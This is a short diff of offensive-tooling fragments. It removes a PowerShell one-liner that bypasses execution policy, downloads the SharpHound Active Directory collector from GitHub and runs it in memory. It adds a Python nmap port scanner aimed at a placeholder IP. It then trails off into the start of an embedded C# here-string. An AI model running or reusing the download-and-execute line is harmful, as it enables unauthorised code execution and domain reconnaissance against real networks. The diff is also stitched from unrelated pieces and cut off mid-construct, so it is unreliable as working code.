@@ -1,9 +1,27 @@
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/Ingestors/SharpHound.ps1'); Invoke-BloodHound -CollectionMethod All"
+import nmap
 
+def scan_ports(target_ip, port_range):
+    nm = nmap.PortScanner()
+    nm.scan(hosts=target_ip, arguments=f'-p {port_range}')
+    
+    for host in nm.all_hosts():
+        print(f"Scanning ports for {host}")
+        for proto in nm[host].all_protocols():
+            print(f"Protocol: {proto}")
+            ports = nm[host][proto].keys()
+            for port in ports:
+                print(f"Port: {port}\tState: {nm[host][proto][port]['state']}")
 
+def main():
+    target_ip = "127.0.0.1"  # Replace with the target IP address
+    port_range = "1-1000"    # Specify the range of ports to scan
 
+    scan_ports(target_ip, port_range)
 
+if __name__ == "__main__":
+    main()
 
+-----------------------------
 
 $rS = @"
         using System;
